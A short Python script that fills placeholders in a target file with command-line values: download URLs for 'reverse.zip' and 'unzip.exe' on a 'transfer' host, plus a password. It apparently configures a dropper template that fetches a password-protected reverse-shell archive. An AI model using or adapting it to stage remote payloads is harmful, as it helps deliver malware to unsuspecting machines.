import sys

if len(sys.argv) != 5:
    print("Usage: python script.py <arg1> <arg2> <arg3> <filename>")
    sys.exit()

arg1 = sys.argv[1]
arg2 = sys.argv[2]
arg3 = sys.argv[3]
filename = sys.argv[4]

with open(filename, 'r') as f:
    content = f.read()

content = content.replace("https://transfer/XXXX/reverse.zip", "https://transfer/" + arg1 + "/reverse.zip")
content = content.replace("PASSX", arg2)
content = content.replace("https://transfer/OOOO/unzip.exe", "https://transfer/" + arg3 + "/unzip.exe")

with open(filename, 'w') as f:
    f.write(content)

